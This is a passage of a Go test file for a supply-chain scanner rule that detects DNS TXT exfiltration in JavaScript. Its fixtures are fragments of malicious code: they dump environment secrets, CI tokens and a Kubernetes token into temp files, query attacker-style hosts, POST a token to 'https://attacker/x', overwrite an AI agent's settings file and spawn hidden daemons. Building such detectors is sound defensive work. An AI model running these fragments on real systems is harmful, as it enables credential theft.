const os = require('os');
w(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
dns.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "renamed-fs.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("renamed fs.writeFileSync destructure must satisfy the staging partner")
	}
}

func TestVuln_DNSTXTExfil_FsPromisesWrite(t *testing.T) {
	// fs.promises.writeFile is the standard promises API.
	body := `
const dns = require('dns');
const fs = require('fs');
const os = require('os');
await fs.promises.writeFile(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
await dns.promises.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "promises.mjs", body), RuleDNSTXTExfil) {
		t.Errorf("fs.promises.writeFile via verified alias must satisfy the staging partner")
	}
}

func TestVuln_DNSTXTExfil_InlineRequireFsPromisesWrite(t *testing.T) {
	// Compact: require('fs').promises.writeFile(...) inline.
	body := `
const dns = require('dns');
require('fs').promises.writeFile(require('os').tmpdir() + '/envs.txt', JSON.stringify(process.env));
dns.resolveTxt('xh.bt.node.js', () => {});
`
	if !hasRule(analyze(t, "inline-promises.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("inline require('fs').promises.writeFile must satisfy the staging partner")
	}
}

func TestVuln_DNSTXTExfil_CombinedESMOsAndFs(t *testing.T) {
	// `import os, { platform } from 'os'` introduces both `os`
	// (default) and `platform`. The default must register so that
	// `os.tmpdir()` later in the file satisfies the archive
	// anchor. Same for fs combined imports.
	body := `
import dns from 'dns';
import os, { platform } from 'os';
import fs, { existsSync } from 'fs';
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
const archive = os.tmpdir() + '/stage.tar.gz';
console.log(platform(), existsSync(archive));
await dns.promises.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "combined-osfs.mjs", body), RuleDNSTXTExfil) {
		t.Errorf("combined ESM imports for os/fs must register default alias and satisfy partners")
	}
}

func TestVuln_DNSTXTExfil_InlineRequireStaging(t *testing.T) {
	// Compact payload: inline require('fs').writeFileSync and
	// require('os').tmpdir with no separate module aliases. Both
	// inline-require shapes must register the partner.
	body := `
const dns = require('dns');
require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', JSON.stringify(process.env));
dns.resolveTxt('exfil.example', () => {});
`
	findings := analyze(t, "inline-stage.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("inline require('fs').writeFileSync and require('os').tmpdir must satisfy partners, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_RenamedDestructureSourceNotBound(t *testing.T) {
	// `const { tmpdir: getTmp } = require('os')` introduces ONLY
	// `getTmp`. A separate local `tmpdir()` helper must NOT be
	// credited as the os anchor just because the destructure
	// mentions `tmpdir` as the source name.
	body := `
const dns = require('dns');
const { tmpdir: getTmp } = require('os');
function tmpdir() { return '/local'; }
const archive = tmpdir() + '/stage.tar.gz';
dns.resolveTxt('example.com', () => {});
console.log(getTmp());
`
	findings := analyze(t, "renamed.cjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("renamed destructure's source name must not be bound, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_UnrelatedWriteFileReceiverIsNotAStagingAnchor(t *testing.T) {
	// `wrapper.writeFileSync(...)` on a local wrapper / mock is
	// not the fs module method; it must not satisfy the envs.txt
	// staging partner.
	body := `
const dns = require('dns');
const wrapper = { writeFileSync: (p, v) => null };
wrapper.writeFileSync('/envs.txt', 'mock');
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "wrapper.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("local wrapper.writeFileSync must not satisfy the fs staging anchor, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_ASINewlineSeparatesStatements(t *testing.T) {
	// JavaScript with no trailing semicolons (ASI). The two
	// statements `const help = '...stage.tar.gz...'` and
	// `const tmp = os.tmpdir()` are separated by a newline that
	// ASI promotes to a statement boundary. They must NOT count
	// as the same statement for the archive partner.
	body := `
const dns = require('dns')
const help = "Use 'stage.tar.gz' in os.tmpdir() to bundle output"
const tmp = require('os').tmpdir()
console.log(tmp, help.length)
dns.resolveTxt('example.com', () => {})
`
	findings := analyze(t, "asi.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("ASI newline must separate statements; archive partner must not fire, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_RegexLiteralBeforeSink(t *testing.T) {
	// A regex literal with `//` (e.g. `/https?:\/\//`) appears on
	// the same minified line as a real resolveTxt sink. The walker
	// must recognize the regex and NOT mask past it as if it were
	// a `//` line comment, so the resolveTxt call still registers.
	body := "const dns = require('dns'); const rx = /https?:\\/\\//; const t = process.env.GITHUB_TOKEN; require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t); dns.resolveTxt('bt.node.js');\n"
	findings := analyze(t, "regex-bypass.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("regex literal containing // must not mask past it; sink must still register, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_DaemonExampleInStringNotAPartner(t *testing.T) {
	// A help string containing a daemonization snippet must not
	// satisfy the daemon partner. A real resolveTxt call paired
	// only with that documentation must not fire the rule.
	body := `
const dns = require('dns');
const example = "cp.spawn('node', ['-e', '...'], {detached: true, stdio: 'ignore'}).unref();";
async function lookup(domain) {
  return await dns.promises.resolveTxt(domain);
}
module.exports = { example, lookup };
`
	findings := analyze(t, "daemon-doc.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("daemon snippet inside a string literal must not satisfy the daemon partner, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_QuotedArchiveTokenWithoutExecutableTmpdir(t *testing.T) {
	// A help string mentions stage.tar.gz; an unrelated os.tmpdir
	// call is elsewhere in code. Neither anchor is in executable
	// code adjacent to the token, so the archive partner must not
	// fire.
	body := `
const dns = require('dns');
const help = "Use 'stage.tar.gz' in os.tmpdir() to bundle output.";
const tmp = require('os').tmpdir();
console.log(tmp, help.length);
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "help-arc.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("archive partner needs executable staging adjacency, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_ResolveTxtMethodDefinitionNotACall(t *testing.T) {
	// An object literal defines its OWN method named resolveTxt.
	// That is a definition, not an invocation of the imported
	// function. Importing `{ resolveTxt }` from dns/promises but
	// using it inside the definition body (and not actually
	// calling it) must not satisfy the sink.
	body := `
import { resolveTxt } from 'dns/promises';
const api = {
  resolveTxt(domain) {
    return null;  // wraps but never invokes the imported one
  },
};
const t = process.env.GITHUB_TOKEN;
console.log(t);
module.exports = api;
`
	findings := analyze(t, "method-def.mjs", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("method-definition resolveTxt must not satisfy the sink, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_BareCallStillFires(t *testing.T) {
	// Sanity: an actual call to the imported resolveTxt MUST still
	// fire even though we now reject definitions.
	body := `
import { resolveTxt } from 'dns/promises';
import fs from 'fs';
import os from 'os';
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
await resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "bare-call.mjs", body), RuleDNSTXTExfil) {
		t.Errorf("real bare resolveTxt invocation must still satisfy the sink")
	}
}

func TestSafe_DNSTXT_UnrelatedSDKResolverIsNotADNSReceiver(t *testing.T) {
	// `new someSdk.Resolver()` from a non-dns SDK must NOT register
	// as a DNS receiver. Even with a real process.env read present,
	// `r.resolveTxt(...)` should not fire JS_DNS_TXT_EXFIL_001.
	body := `
const someSdk = require('graphql');
const r = new someSdk.Resolver();
const t = process.env.GITHUB_TOKEN;
r.resolveTxt('zone'); // graphql Resolver's own resolveTxt, unrelated to dns
`
	findings := analyze(t, "graphql.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("non-dns Resolver constructor must not register as a DNS receiver, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_EnvsTxtPartnerNeedsExecutableWrite(t *testing.T) {
	// `envs.txt` mentioned inside a doc string + an unrelated env
	// read (NODE_ENV) in code must not satisfy the envs.txt
	// partner. The fs-write anchor is required.
	body := `
const dns = require('dns');
const docs = "fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));";
const mode = process.env.NODE_ENV;
dns.resolveTxt('example.com', () => {});
module.exports = { docs, mode };
`
	findings := analyze(t, "doc-env.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("envs.txt staging needs an executable fs.write near the token, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_CombinedESMImports(t *testing.T) {
	// `import dns, { Resolver } from 'dns'` and the wildcard form
	// `import dns, * as dnsP from 'dns'` are valid ES module
	// imports. Both the default identifier and the trailing
	// clause must register as dns receivers.
	caseDestructure := `
import dns, { Resolver } from 'dns';
import fs from 'fs';
import os from 'os';
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
dns.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "combined-d.mjs", caseDestructure), RuleDNSTXTExfil) {
		t.Errorf("import default + destructure: default alias must satisfy the sink")
	}

	caseNamespace := `
import dns, * as dnsP from 'dns';
const archive = require('os').tmpdir() + '/stage.tar.gz';
const t = process.env.GITHUB_TOKEN;
require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
dnsP.resolveTxt('xh.bt.node.js');
`
	if !hasRule(analyze(t, "combined-ns.mjs", caseNamespace), RuleDNSTXTExfil) {
		t.Errorf("import default + namespace: namespace alias must satisfy the sink")
	}

	caseResolveTxtDestructured := `
import dns, { resolveTxt } from 'dns/promises';
import fs from 'fs';
import os from 'os';
const t = process.env.AWS_ACCESS_KEY_ID;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
await resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "combined-r.mjs", caseResolveTxtDestructured), RuleDNSTXTExfil) {
		t.Errorf("import default + { resolveTxt } from 'dns/promises': destructured call must satisfy the sink")
	}
}

func TestVuln_DNSTXTExfil_DestructuredResolverConstructor(t *testing.T) {
	// `const { Resolver } = require('node:dns'); const r = new
	// Resolver(); r.resolveTxt(...)` is the documented Node form;
	// the alias detector must follow Resolver from destructure to
	// new-instance binding.
	body := `
const { Resolver } = require('node:dns');
const r = new Resolver();
const t = process.env.GITHUB_TOKEN;
require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
r.resolveTxt('bt.node.js', () => {});
`
	if !hasRule(analyze(t, "destructured-resolver.cjs", body), RuleDNSTXTExfil) {
		t.Errorf("destructured Resolver + new + resolveTxt must satisfy the sink")
	}
}

func TestVuln_DNSTXTExfil_CredentialPathRead(t *testing.T) {
	// fs.readFileSync against a known credential path is a real
	// secret read — the path lives inside a string literal but the
	// partner signal must still register.
	body := `
const dns = require('dns');
const fs = require('fs');
const token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token');
dns.resolveTxt('bt.node.js', () => {});
`
	if !hasRule(analyze(t, "k8s.js", body), RuleDNSTXTExfil) {
		t.Errorf("credential path read must satisfy the secret partner, got findings: nope")
	}
}

func TestSafe_DNSTXT_PartnerExamplesInsideStringLiterals(t *testing.T) {
	// A help / readme string contains an envs.txt staging snippet
	// AND a tar.gz archive snippet, but neither is executable. With
	// a real resolveTxt call present, the rule must not fire.
	body := `
const dns = require('dns');
const HELP = "fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env)); also tar.gz to os.tmpdir";
async function lookupSPF(domain) {
  return await dns.promises.resolveTxt('_spf.' + domain);
}
module.exports = { HELP, lookupSPF };
`
	findings := analyze(t, "help-strings.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("stringified partner snippets must not satisfy archive/envs partners, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_StringifiedDNSBindingNotAnAlias(t *testing.T) {
	// A stringified `require('dns')` mention must not register
	// `dns` as a real alias. Without a real alias binding, an
	// unrelated `dns.resolveTxt(...)` call elsewhere does not fire.
	body := `
const example = "const dns = require('dns');";
const dns = { resolveTxt: () => null };
dns.resolveTxt('zone');
const t = process.env.GITHUB_TOKEN;
require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
`
	findings := analyze(t, "fake.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("stringified require('dns') must not register a real dns alias, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_StringLiteralEnvMentionNotAPartner(t *testing.T) {
	// A documentation string mentions process.env.GITHUB_TOKEN as
	// usage guidance. The secret partner must not register from
	// inside a string literal, so a real dns.resolveTxt call paired
	// only with that string must not fire.
	body := `
const dns = require('dns');
const HELP = "export process.env.GITHUB_TOKEN in CI before running.";
async function lookup(domain) {
  return await dns.promises.resolveTxt(domain);
}
module.exports = { HELP, lookup };
`
	findings := analyze(t, "help.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("stringified env-var mention must not satisfy the secret partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_MultiMemberPromisesDestructure(t *testing.T) {
	// `{ promises: dns, Resolver }` and the ESM equivalent must
	// register the `dns` alias as a receiver so subsequent
	// `dns.resolveTxt(...)` calls fire the rule.
	cjs := `
const { promises: dns, Resolver } = require('dns');
const fs = require('fs');
const os = require('os');
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
await dns.resolveTxt('bt.node.js');
`
	if !hasRule(analyze(t, "multi-cjs.cjs", cjs), RuleDNSTXTExfil) {
		t.Errorf("CJS multi-member promises destructure must satisfy the sink")
	}

	esm := `
import { promises as dns, Resolver } from 'dns';
import fs from 'fs';
import os from 'os';
const archive = os.tmpdir() + '/stage.tar.gz';
await dns.resolveTxt('xh.bt.node.js');
`
	if !hasRule(analyze(t, "multi-esm.mjs", esm), RuleDNSTXTExfil) {
		t.Errorf("ESM multi-member promises destructure must satisfy the sink")
	}
}

func TestSafe_DNSTXT_StringLiteralExampleNotASink(t *testing.T) {
	// A documentation string contains `dns.resolveTxt(...)` text
	// even though no DNS call is made. With other partner signals
	// present, the previous version would still fire HIGH; the
	// string-interior filter must skip the match.
	body := `
const dns = require('dns');
const doc = "Use dns.resolveTxt('example.com') to query TXT records";
const t = process.env.GITHUB_TOKEN;
require('fs').writeFileSync(require('os').tmpdir() + '/envs.txt', t);
module.exports = { doc };
`
	findings := analyze(t, "doc.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("string-literal resolveTxt example must not satisfy the sink, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_CommentedDaemonExampleIsNotAPartner(t *testing.T) {
	// A real resolveTxt call alongside ONLY a commented daemon
	// example must not fire: the daemon partner has to come from
	// executable code, not from documentation.
	body := `
const dns = require('dns');
// Historical exploit shape:
//   const cp = require('child_process');
//   cp.spawn('node', ['-e', '...'], {detached: true, stdio: 'ignore'}).unref();
dns.resolveTxt('example.com', () => {});
`
	findings := analyze(t, "history.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("commented daemon example must not satisfy the daemon partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_PromisesNamespaceDestructure(t *testing.T) {
	// `const { promises: dns } = require('node:dns')` binds the
	// promises namespace to a local alias. Calls like
	// `await dns.resolveTxt(...)` against that alias must register
	// as the DNS sink.
	body := `
const { promises: dns } = require('node:dns');
const fs = require('fs');
const os = require('os');
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
await dns.resolveTxt('xh.bt.node.js');
`
	findings := analyze(t, "ns.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("promises namespace destructure must satisfy the DNS sink, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_PromisesNamespaceESM(t *testing.T) {
	// `import { promises as dns } from 'dns'` is the ESM form.
	body := `
import { promises as dns } from 'dns';
import fs from 'fs';
import os from 'os';
const archive = os.tmpdir() + '/stage.tar.gz';
await dns.resolveTxt('bt.node.js');
`
	findings := analyze(t, "esm.mjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("ESM `promises as dns` namespace import must satisfy the DNS sink, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_PartnerSignalsInCommentsOnly(t *testing.T) {
	// A legitimate DNS TXT library that mentions CI tokens and
	// envs.txt only in comments must not satisfy any partner
	// signal. With no real chain partners, the rule must not fire.
	body := `
const dns = require('dns');
// In CI, set process.env.GITHUB_TOKEN before calling this module.
// The helper used to write envs.txt; we removed that behavior.
/* fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env)) */
async function lookupSPF(domain) {
  return await dns.promises.resolveTxt(domain);
}
module.exports = { lookupSPF };
`
	findings := analyze(t, "spf.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("commented partner mentions must not satisfy the DNS chain, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_CommentedExampleIsNotASink(t *testing.T) {
	// A documentation file binds the dns module and shows
	// resolveTxt examples in line and block comments. Even with
	// partner signals present (CI token + envs.txt write), the rule
	// must not fire because no executable resolveTxt call exists.
	body := `
const dns = require('dns');
const fs = require('fs');
const os = require('os');
// Example: dns.resolveTxt('example.com', cb)
/* Or: const r = new dns.Resolver(); r.resolveTxt('zone.example') */
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', t);
console.log('see comments above for resolveTxt usage');
`
	findings := analyze(t, "docs.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("commented resolveTxt examples must not satisfy the sink, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_DestructuredTmpdirArchive(t *testing.T) {
	// `const { tmpdir } = require('os')` plus `tmpdir() + 'stage.tar.gz'`
	// is the destructured form of os.tmpdir staging. With a real
	// resolveTxt call accompanying it, the archive partner must
	// register so the rule fires.
	body := `
const dns = require('dns');
const { tmpdir } = require('os');
const archive = tmpdir() + '/stage.tar.gz';
dns.resolveTxt('xh.bt.node.js', () => {});
`
	findings := analyze(t, "destructured.cjs", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("destructured tmpdir + tar.gz archive must satisfy the archive partner, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_BareEnvsTxtFilenameOnly(t *testing.T) {
	// A library that merely stores the filename `envs.txt` as a
	// constant near a resolveTxt call must NOT set the staging
	// partner. With no other partners, the rule must not fire.
	body := `
const dns = require('dns');
const filename = 'envs.txt';
dns.resolveTxt('example.com', () => { /* could log to filename later */ });
`
	findings := analyze(t, "bare.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("bare envs.txt filename constant must not satisfy the staging partner, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_EnvsTxtTemplateLiteralPath(t *testing.T) {
	// Real payloads frequently use a template-literal path for the
	// envs.txt staging file. The signal must match regardless of
	// whether the path is built with `'` strings, `"` strings, or
	// backtick template literals.
	body := "\n" +
		"const dns = require('dns');\n" +
		"const fs = require('fs');\n" +
		"const os = require('os');\n" +
		"fs.writeFileSync(`${os.tmpdir()}/envs.txt`, JSON.stringify(process.env));\n" +
		"const archive = os.tmpdir() + '/stage.tar.gz';\n" +
		"dns.resolveTxt('exfil.example', () => {});\n"
	findings := analyze(t, "tmpl.js", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("template-literal envs.txt path must satisfy the staging signal, got: %+v", findings)
	}
}

func TestVuln_DNSTXTExfil_ArchiveProximityCrossLines(t *testing.T) {
	// path.join wrapping splits os.tmpdir and the .tar.gz across
	// lines. The archive proximity match must span the newlines.
	body := `
const dns = require('dns');
const os = require('os');
const path = require('path');
const archive = path.join(
  os.tmpdir(),
  'stage.tar.gz',
);
dns.resolveTxt('xh.bt.node.js', () => {});
`
	findings := analyze(t, "split.js", body)
	if !hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("multi-line tar.gz / os.tmpdir proximity must still satisfy archive signal, got: %+v", findings)
	}
}

func TestSafe_DNSTXT_StringMentionNotCall(t *testing.T) {
	// A bare string mention of `resolveTxt` (in a comment, a JSON
	// manifest, or documentation) without a real call must not
	// satisfy the sink signal.
	body := `
// This module wraps dns.resolveTxt; see docs.
const features = ['resolveTxt', 'resolve4'];
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {body:t});
`
	findings := analyze(t, "docs.js", body)
	if hasRule(findings, RuleDNSTXTExfil) {
		t.Errorf("string mention of resolveTxt must not satisfy the DNS sink, got: %+v", findings)
	}
}

// --- finding shape regression ---

func TestFindingsHaveStableFields(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:t});
require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
const cp = require('child_process');
const c = cp.spawn('node', ['x'], {detached: true, stdio: 'ignore'}); c.unref();
const m = require('fs').readFileSync('/proc/self/maps');
if (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}
`
	findings := analyze(t, "full.js", body)
	if len(findings) == 0 {
		t.Fatalf("expected findings, got none")
	}
	seenLines := map[int]string{}
	for _, f := range findings {
		if f.Analyzer != AnalyzerName {
			t.Errorf("finding %s: analyzer = %q, want %q", f.RuleID, f.Analyzer, AnalyzerName)
		}
		if f.Category != "supply-chain" {
			t.Errorf("finding %s: category = %q, want supply-chain", f.RuleID, f.Category)
		}
		if !strings.HasPrefix(f.RuleID, "JS_") && !strings.HasPrefix(f.RuleID, "AGENT_") {
			t.Errorf("finding ruleID %q should have JS_ or AGENT_ prefix", f.RuleID)
		}
		if f.Confidence == 0 {
			t.Errorf("finding %s: confidence should be > 0", f.RuleID)
		}
		if f.Remediation == "" {
			t.Errorf("finding %s: remediation should be non-empty", f.RuleID)
		}
		if f.Line == 0 {
			t.Errorf("finding %s: line should be > 0", f.RuleID)
		}
		if prev, ok := seenLines[f.Line]; ok {
			t.Logf("two findings on line %d: %s and %s (cross-rule dedup may drop one)", f.Line, prev, f.RuleID)
		}
		seenLines[f.Line] = f.RuleID
	}
}
